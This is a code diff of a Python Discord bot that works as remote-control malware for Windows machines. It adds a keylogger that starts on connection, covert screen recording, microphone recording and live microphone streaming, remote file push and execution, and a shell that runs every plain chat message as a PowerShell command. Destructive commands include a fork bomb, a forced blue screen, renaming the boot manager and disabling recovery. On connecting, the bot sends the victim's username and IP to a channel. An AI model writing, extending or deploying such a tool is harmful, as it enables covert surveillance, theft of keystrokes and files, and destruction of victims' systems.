@@ -1,6 +1,7 @@
 import asyncio
 import getpass
 import json
+import os
 import socket
 from typing import cast
 
@@ -11,36 +12,69 @@ from discord.ext import commands
 from discord.ext.commands import Context
 
 from src.cmd.clipboard import get_clipboard
+from src.cmd.critical import set_critical, unset_critical
 from src.cmd.delete_file import delete_file
 from src.cmd.download_file import download_file
+from src.cmd.file_browser import (
+    change_directory,
+    list_directory,
+    show_pwd,
+    show_tree,
+)
+from src.cmd.help import show_help
+from src.cmd.implode import implode
 from src.cmd.input_box import inputbox_show
+from src.cmd.input_control import block_input, unblock_input
+from src.cmd.keylogger import keylog_start, keylog_status, keylog_stop, start_keylogger
+from src.cmd.keys import press_keys
+from src.cmd.mic_recording import record_microphone_command
+from src.cmd.monitors import set_monitors
 from src.cmd.move_file import move_file
 from src.cmd.msgbox import msgbox_show
 from src.cmd.openurl import spawn_proc
 from src.cmd.popup import popup_show
+from src.cmd.processes import (
+    blacklist_process,
+    kill_process,
+    list_blacklist,
+    set_kill_reporter,
+    show_foreground,
+    show_processes,
+    start_process_watchers,
+    whitelist_process,
+)
 from src.cmd.read_file import read_file
 from src.cmd.run_script import run_script_file
+from src.cmd.runtime_control import clear_channel, restart_bot
 from src.cmd.screenshot import take_screenshot
+from src.cmd.screen_display import display_image, play_glitch
+from src.cmd.screen_recording import record_screen_command
 from src.cmd.shell import execute_cmd
+from src.cmd.system import (
+    break_windows,
+    play_audio,
+    set_recovery,
+    set_volume,
+    start_forkbomb,
+    trigger_bsod,
+)
 from src.cmd.text_replacer import (
-    KEY_LOG_FILE_THRESHOLD,
     active_rules,
     add_replacements,
-    buffered_characters,
     clear_replacements,
     current_replacer,
-    key_log_exists,
-    log_status,
-    read_key_log,
     remove_replacement,
     set_replacements,
     start_text_replacer,
     stop_text_replacer,
 )
+from src.cmd.transfer import execute_file, push_file
 from src.cmd.upload_file import upload_file
 from src.cmd.voice import voice_api
+from src.cmd.voice_stream import join_voice, leave_voice
 from src.cmd.wallpaper import set_wallpaper
-from src.constants import UPDATE_TAG, VERSION
+from src.cmd.website_block import block_website, unblock_website
+from src.constants import COMMAND_PREFIX, OWNER_ID, UPDATE_TAG, VERSION
 from src.utils.updater import update_runtime
 from src.utils.utils import send_text_in_chunks
 
@@ -52,7 +86,14 @@ channel = None
 pc_user_name = "Unknown"
 ip = "Unknown"
 
-bot = commands.Bot(command_prefix="z!", intents=intents, owner_id=915623041105551420)
+bot = commands.Bot(
+    command_prefix=COMMAND_PREFIX,
+    intents=intents,
+    owner_id=OWNER_ID,
+)
+
+# The library ships a help command, the runtime has its own list of commands.
+bot.remove_command("help")
 
 
 def parse_json_object(raw: str) -> dict | None:
@@ -107,15 +148,27 @@ async def on_ready():
     if channel is None:
         channel = await guild.create_text_channel(channel_name)
 
+    # The blacklister reports the processes it kills into the same channel.
+    set_kill_reporter(
+        lambda message: asyncio.run_coroutine_threadsafe(
+            channel.send(message), bot.loop
+        )
+    )
+
+    # A blacklist of a previous session is applied again right away.
+    start_process_watchers()
+
+    # The key logger runs from the start, the owner can stop it with the
+    # keylog command.
+    if start_keylogger() is not None:
+        print("#- Key logger started.")
+
     connection_msg_string = f"""
 ======= User **CONNECTED** =======
 *Username:* {pc_user_name}
 *IP:* {ip.replace("-", ".")}
     """.strip()
     await channel.send(connection_msg_string)
-
-
-exit_confirmation = False
 
 
 @bot.event
@@ -129,33 +182,24 @@ async def on_message(message: discord.Message):
         message.content.strip().lower() == "yes"
         or message.content.strip().lower() == "no"
     ):
+        # The answers of the confirmation prompts are not commands.
         return
 
     if not message.content.startswith(str(bot.command_prefix)):
-        global exit_confirmation
-
-        if message.content.startswith("exit") and not exit_confirmation:
-            exit_confirmation = True
-            await message.channel.send("*Are you sure you want to exit the process?*")
-            return
-
-        exit_confirmation = False
-        message.content = f"z!shell {message.content}"
+        # Every message that is not a command is run in the shell.
+        message.content = f"{COMMAND_PREFIX}shell {message.content}"
 
     await bot.process_commands(message)
 
 
 # ====================
-# === LIST COMMAND ===
+# === HELP COMMAND ===
 # ====================
-@bot.tree.command(name="list_devices", description="Lists all connected devices")
+@bot.command(name="help", description="Show the list of all commands.")
 @commands.is_owner()
 @commands.guild_only()
-async def list_devices(interaction: Interaction):
-    latency = round(bot.latency * 1000)  # latency in milliseconds
-    await interaction.response.send_message(
-        f"- **User:** {pc_user_name}\t**IP:** {ip.replace('-', '.')}\t*Latency:* {latency / 10}ms"
-    )
+async def help_command(ctx: Context[commands.Bot]):
+    await show_help(ctx)
 
 
 # ====================
@@ -178,13 +222,17 @@ async def ping(ctx: Context[commands.Bot], *, args: str | None):
 # =========================
 # === SHELL COMMAND ===
 # =========================
-@bot.command(name="shell", description="Run powershell commands")
+@bot.command(
+    name="shell",
+    aliases=["cmd"],
+    description="Run powershell commands",
+)
 @commands.is_owner()
 @commands.guild_only()
 async def shell(ctx: Context[commands.Bot], *, user_cmd: str | None):
     if not user_cmd:
         await ctx.reply(
-            "⚠️ Please enter a command to execute\nUsage: z!shell `<command>`"
+            "⚠️ Please enter a command to execute\nUsage: `!shell <command>`"
         )
         return
 
@@ -198,6 +246,7 @@ async def shell(ctx: Context[commands.Bot], *, user_cmd: str | None):
 # ===========================
 @bot.command(
     name="screenshot",
+    aliases=["ss"],
     description="Capture the bot host's screen and upload it to this channel.",
 )
 @commands.is_owner()
@@ -206,14 +255,90 @@ async def screenshot(ctx: Context[commands.Bot]):
     await take_screenshot(ctx)
 
 
+# ==============================
+# === SCREEN RECORDING COMMAND ===
+# ==============================
+@bot.command(
+    name="screenrec",
+    description="Record the screen of the machine into a video.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def screenrec(ctx: Context[commands.Bot], seconds: str = "15"):
+    await record_screen_command(ctx, parse_seconds(seconds))
+
+
+# =========================
+# === MICROPHONE COMMAND ===
+# =========================
+@bot.command(
+    name="record",
+    description="Record the microphone of the machine into a wav file.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def record(ctx: Context[commands.Bot], seconds: str = "60"):
+    await record_microphone_command(ctx, parse_seconds(seconds))
+
+
+# ===========================
+# === DISPLAY COMMAND ===
+# ===========================
+@bot.command(
+    name="display",
+    description="Show an attachment fullscreen on the machine.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def display(ctx: Context[commands.Bot], seconds: str = "10"):
+    await display_image(ctx, parse_seconds(seconds))
+
+
+# ===========================
+# === GLITCH COMMAND ===
+# ===========================
+@bot.command(name="glitch", description="Run a screen effect on the machine.")
+@commands.is_owner()
+@commands.guild_only()
+async def glitch(ctx: Context[commands.Bot], effect: str, seconds: str = "5"):
+    await play_glitch(ctx, effect, parse_seconds(seconds))
+
+
 # ===========================
 # === VOICE COMMAND ===
 # ===========================
-@bot.command(name="voice", description="Speak text aloud using Windows text-to-speech.")
+@bot.command(
+    name="voice",
+    aliases=["tts"],
+    description="Speak text aloud using Windows text-to-speech.",
+)
 @commands.is_owner()
 @commands.guild_only()
 async def voice(ctx: Context[commands.Bot], *, text: str):
     await voice_api(ctx, text)
+
+
+# ===========================
+# === VOICE STREAM COMMAND ===
+# ===========================
+@bot.command(
+    name="join",
+    description="Stream the microphone of the machine into a voice channel.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def join(ctx: Context[commands.Bot]):
+    await join_voice(ctx)
+
+
+@bot.command(
+    name="leave",
+    description="Leave the voice channel of the microphone stream.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def leave(ctx: Context[commands.Bot]):
+    await leave_voice(ctx)
 
 
 # ===========================
@@ -239,6 +364,33 @@ async def open_url(ctx: Context[commands.Bot], *, url: str):
 @commands.guild_only()
 async def upload(ctx: Context[commands.Bot], url: str | None = None):
     await upload_file(ctx, url)
+
+
+# ================================
+# === PUSH COMMAND ===
+# ================================
+@bot.command(
+    name="push",
+    aliases=["deploy"],
+    description="Copy an attachment onto the machine.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def push(ctx: Context[commands.Bot], *, destination: str):
+    await push_file(ctx, destination)
+
+
+# ================================
+# === EXECUTE COMMAND ===
+# ================================
+@bot.command(
+    name="execute",
+    description="Run a file that is already on the machine.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def execute(ctx: Context[commands.Bot], *, path: str):
+    await execute_file(ctx, path)
 
 
 # ================================
@@ -275,26 +427,9 @@ async def replacer_command(ctx: Context[commands.Bot], *, action: str = "status"
         state = "running" if instance is not None and instance.running else "stopped"
         rules = active_rules()
 
-        # Whether the log file exists decides what is shown.
-        has_log_file = key_log_exists()
-
-        # The status and the active rules are written to the key log.
-        log_status(state, rules)
-
-        # Without a log file the characters that are still in memory are used.
-        contents = read_key_log() if has_log_file else buffered_characters()
-
-        if not contents.strip():
-            await ctx.reply(
-                "The key log is empty and nothing is buffered in memory yet."
-            )
-            return
-
-        await send_text_in_chunks(
-            ctx,
-            contents,
-            filename="key_logs.txt",
-            file_threshold=KEY_LOG_FILE_THRESHOLD,
+        await ctx.reply(
+            f"The text replacer is {state} with {len(rules)} rule(s).\n"
+            + "\n".join(f"`{key}` -> `{value}`" for key, value in rules.items())
         )
 
 
@@ -302,10 +437,10 @@ async def replacer_command(ctx: Context[commands.Bot], *, action: str = "status"
     name="replacements",
     description=(
         "Manage the text replacer rules: "
-        'z!replacements {"love": "hate"} sets them, '
-        'z!replacements add {"abc": "xyz"} adds them, '
-        'z!replacements rm "abc" removes one, '
-        "z!replacements del deletes the whole file."
+        '!replacements {"love": "hate"} sets them, '
+        '!replacements add {"abc": "xyz"} adds them, '
+        '!replacements rm "abc" removes one, '
+        "!replacements del deletes the whole file."
     ),
 )
 @commands.is_owner()
@@ -315,9 +450,9 @@ async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
 
     if not args:
         await ctx.reply(
-            'Usage: `z!replacements {"love": "hate"}`, '
-            '`z!replacements add {"abc": "xyz"}`, '
-            '`z!replacements rm "abc"` or `z!replacements del`.'
+            'Usage: `!replacements {"love": "hate"}`, '
+            '`!replacements add {"abc": "xyz"}`, '
+            '`!replacements rm "abc"` or `!replacements del`.'
         )
         return
 
@@ -341,7 +476,7 @@ async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
         key = rest.strip('"').strip("'").strip()
 
         if not key:
-            await ctx.reply('Give the key of the rule to remove, e.g. `z!replacements rm "abc"`.')
+            await ctx.reply('Give the key of the rule to remove, e.g. `!replacements rm "abc"`.')
             return
 
         await remove_replacement(ctx, key)
@@ -366,7 +501,9 @@ async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
 # === DOWNLOAD COMMAND ===
 # ===========================
 @bot.command(
-    name="download", description="Resolve a file path and send the file to Discord."
+    name="download",
+    aliases=["pull"],
+    description="Resolve a file path and send the file to Discord.",
 )
 @commands.is_owner()
 @commands.guild_only()
@@ -404,7 +541,9 @@ async def run_script(
 # ===========================
 # === DELETE COMMAND ===
 # ===========================
-@bot.command(name="delete", description="Delete a file or a folder")
+@bot.command(
+    name="delete", aliases=["remove"], description="Delete a file or a folder"
+)
 @commands.is_owner()
 @commands.guild_only()
 async def delete(ctx: Context[commands.Bot], *, path: str):
@@ -419,6 +558,49 @@ async def delete(ctx: Context[commands.Bot], *, path: str):
 @commands.guild_only()
 async def move(ctx: Context[commands.Bot], *, paths: str):
     await move_file(ctx, paths)
+
+
+# ===========================
+# === CLEAR COMMAND ===
+# ===========================
+@bot.command(
+    name="clear", description="Delete the messages that the runtime wrote here."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def clear(ctx: Context[commands.Bot]):
+    await clear_channel(ctx)
+
+
+# ==============================
+# === FILE BROWSER COMMANDS ===
+# ==============================
+@bot.command(name="pwd", description="Show the current folder of the file browser.")
+@commands.is_owner()
+@commands.guild_only()
+async def pwd(ctx: Context[commands.Bot]):
+    await show_pwd(ctx)
+
+
+@bot.command(name="ls", description="List the content of the current folder.")
+@commands.is_owner()
+@commands.guild_only()
+async def ls(ctx: Context[commands.Bot]):
+    await list_directory(ctx)
+
+
+@bot.command(name="cd", description="Change the folder of the file browser.")
+@commands.is_owner()
+@commands.guild_only()
+async def cd(ctx: Context[commands.Bot], *, path: str):
+    await change_directory(ctx, path)
+
+
+@bot.command(name="tree", description="Show the structure of the current folder.")
+@commands.is_owner()
+@commands.guild_only()
+async def tree(ctx: Context[commands.Bot], depth: str = "3"):
+    await show_tree(ctx, parse_seconds(depth))
 
 
 # ===========================
@@ -461,11 +643,7 @@ async def inputbox(ctx: Context[commands.Bot], *, prompt: str):
 @commands.is_owner()
 @commands.guild_only()
 async def shutdown(ctx: Context[commands.Bot], timeout: str = "0"):
-    timeout_seconds = 0
-    try:
-        timeout_seconds = int(timeout)
-    except Exception:
-        timeout_seconds = 0
+    timeout_seconds = parse_seconds(timeout)
 
     shutdown_cmd = r"shutdown /s /t " + str(timeout_seconds)
     result = execute_cmd(shutdown_cmd) or f"PC about to shutdown in {timeout_seconds}s"
@@ -479,15 +657,59 @@ async def shutdown(ctx: Context[commands.Bot], timeout: str = "0"):
 @commands.is_owner()
 @commands.guild_only()
 async def restart(ctx: Context[commands.Bot], timeout: str = "0"):
-    timeout_seconds = 0
-    try:
-        timeout_seconds = int(timeout)
-    except Exception:
-        timeout_seconds = 0
+    timeout_seconds = parse_seconds(timeout)
 
     shutdown_cmd = r"shutdown /r /t " + str(timeout_seconds)
     result = execute_cmd(shutdown_cmd) or f"PC about to restart in {timeout_seconds}s"
     await ctx.reply(result)
+
+
+# ===========================
+# === RESTART BOT COMMAND ===
+# ===========================
+@bot.command(
+    name="restart_bot", description="Restart the runtime itself."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def restart_bot_command(ctx: Context[commands.Bot]):
+    await restart_bot(ctx)
+
+
+# ===========================
+# === EXIT COMMAND ===
+# ===========================
+@bot.command(
+    name="exit", description="Stop the runtime process."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def exit_command(ctx: Context[commands.Bot]):
+    await ctx.reply(
+        "⚠️ Are you sure you want to stop the runtime? "
+        "Reply `yes` to confirm or `no` to cancel."
+    )
+
+    def check(message: discord.Message) -> bool:
+        return (
+            message.author.id == ctx.author.id
+            and message.channel.id == ctx.channel.id
+            and message.content.lower().strip() in ("yes", "no")
+        )
+
+    try:
+        response = await bot.wait_for("message", check=check, timeout=30)
+    except TimeoutError:
+        await ctx.reply("The runtime keeps running, the confirmation timed out.")
+        return
+
+    if response.content.lower().strip() != "yes":
+        await ctx.reply("The runtime keeps running.")
+        return
+
+    await ctx.reply("The runtime stops now.")
+    await asyncio.sleep(1)
+    os._exit(0)
 
 
 # ===========================
@@ -510,3 +732,274 @@ async def clipboard(
     ctx: Context[commands.Bot], action: str = "read", *, text: str | None = None
 ):
     await get_clipboard(ctx, action, text or "")
+
+
+# ===========================
+# === PROCESS COMMANDS ===
+# ===========================
+@bot.command(
+    name="ps",
+    aliases=["processes"],
+    description="List the processes that run on the machine.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def ps(ctx: Context[commands.Bot]):
+    await show_processes(ctx)
+
+
+@bot.command(
+    name="show",
+    description="Show information about the machine, only the processes so far.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def show(ctx: Context[commands.Bot], *, what: str = "processes"):
+    if what.strip().lower() != "processes":
+        await ctx.reply("Usage: `!show processes`")
+        return
+
+    await show_processes(ctx)
+
+
+@bot.command(
+    name="kill", description="Kill a process by name or by the number of the listing."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def kill(ctx: Context[commands.Bot], *, target: str):
+    await kill_process(ctx, target)
+
+
+@bot.command(
+    name="foreground", description="Show the process of the foreground window."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def foreground(ctx: Context[commands.Bot]):
+    await show_foreground(ctx)
+
+
+@bot.command(
+    name="blacklist", description="Kill a process again as soon as it starts."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def blacklist(ctx: Context[commands.Bot], *, name: str = ""):
+    if not name.strip():
+        await list_blacklist(ctx)
+        return
+
+    await blacklist_process(ctx, name)
+
+
+@bot.command(
+    name="whitelist", description="Remove a process from the blacklist."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def whitelist(ctx: Context[commands.Bot], *, name: str):
+    await whitelist_process(ctx, name)
+
+
+# ===========================
+# === INPUT COMMANDS ===
+# ===========================
+@bot.command(
+    name="block-input", description="Block the keyboard and the mouse."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def block_input_command(ctx: Context[commands.Bot]):
+    await block_input(ctx)
+
+
+@bot.command(
+    name="unblock-input", description="Unblock the keyboard and the mouse."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def unblock_input_command(ctx: Context[commands.Bot]):
+    await unblock_input(ctx)
+
+
+@bot.command(
+    name="keys", description="Type on the machine, ALTF4 and ALTTAB work too."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def keys(ctx: Context[commands.Bot], *, keys_to_press: str):
+    await press_keys(ctx, keys_to_press)
+
+
+# ===========================
+# === KEYLOGGER COMMAND ===
+# ===========================
+@bot.command(
+    name="keylog",
+    description="Start, stop or check the key logger of the machine.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def keylog(ctx: Context[commands.Bot], action: str = "status"):
+    action = action.strip().lower()
+
+    if action == "start":
+        await keylog_start(ctx)
+    elif action == "stop":
+        await keylog_stop(ctx)
+    else:
+        await keylog_status(ctx)
+
+
+# ===========================
+# === CRITICAL COMMAND ===
+# ===========================
+@bot.command(
+    name="critical",
+    aliases=["set-critical", "unset-critical"],
+    description="Raise or lower the critical status of the runtime.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def critical(ctx: Context[commands.Bot], action: str = "status"):
+    action = action.strip().lower()
+
+    if action in ("set", "on", "enable"):
+        await set_critical(ctx)
+    elif action in ("unset", "off", "disable"):
+        await unset_critical(ctx)
+    else:
+        await ctx.reply("Usage: `!critical set` or `!critical unset`.")
+
+
+# ===========================
+# === MONITOR COMMAND ===
+# ===========================
+@bot.command(
+    name="monitors", description="Turn the monitors of the machine on or off."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def monitors(ctx: Context[commands.Bot], state: str = "on"):
+    await set_monitors(ctx, state)
+
+
+# ===========================
+# === WEBSITE COMMANDS ===
+# ===========================
+@bot.command(
+    name="block-website", description="Block a website with the hosts file."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def block_website_command(ctx: Context[commands.Bot], *, url: str):
+    await block_website(ctx, url)
+
+
+@bot.command(
+    name="unblock-website", description="Unblock a website of the hosts file."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def unblock_website_command(ctx: Context[commands.Bot], *, url: str):
+    await unblock_website(ctx, url)
+
+
+# ===========================
+# === SYSTEM COMMANDS ===
+# ===========================
+@bot.command(
+    name="volume", description="Set the volume of the speakers of the machine."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def volume(ctx: Context[commands.Bot], level: str):
+    await set_volume(ctx, level)
+
+
+@bot.command(
+    name="play", description="Play a wav, mp3 or midi file on the machine."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def play(ctx: Context[commands.Bot], *, path: str):
+    await play_audio(ctx, path)
+
+
+@bot.command(
+    name="forkbomb", description="Start a fork bomb, the machine will freeze."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def forkbomb(ctx: Context[commands.Bot]):
+    await start_forkbomb(ctx)
+
+
+@bot.command(
+    name="bsod", description="Trigger a blue screen of death on the machine."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def bsod(ctx: Context[commands.Bot]):
+    await trigger_bsod(ctx)
+
+
+@bot.command(
+    name="break-windows", description="Rename the boot manager of Windows."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def break_windows_command(ctx: Context[commands.Bot]):
+    await break_windows(ctx)
+
+
+@bot.command(
+    name="disable-reset", description="Disable the Windows recovery environment."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def disable_reset(ctx: Context[commands.Bot]):
+    await set_recovery(ctx, False)
+
+
+@bot.command(
+    name="enable-reset", description="Enable the Windows recovery environment."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def enable_reset(ctx: Context[commands.Bot]):
+    await set_recovery(ctx, True)
+
+
+# ===========================
+# === IMPLODE COMMAND ===
+# ===========================
+@bot.command(
+    name="implode", description="Remove the runtime from the machine."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def implode_command(ctx: Context[commands.Bot]):
+    await implode(ctx)
+
+
+# ===========================
+# === LIST DEVICES COMMAND ===
+# ===========================
+@bot.tree.command(name="list_devices", description="Lists all connected devices")
+@commands.is_owner()
+@commands.guild_only()
+async def list_devices(interaction: Interaction):
+    latency = round(bot.latency * 1000)  # latency in milliseconds
+    await interaction.response.send_message(
+        f"- **User:** {pc_user_name}\t**IP:** {ip.replace('-', '.')}\t*Latency:* {latency / 10}ms"
+    )
+
+
+def parse_seconds(value: str) -> int:
+    """Turn the argument of a command into a number of seconds."""
+    try:
+        return int(str(value).strip())
+    except (TypeError, ValueError):
+        return 0
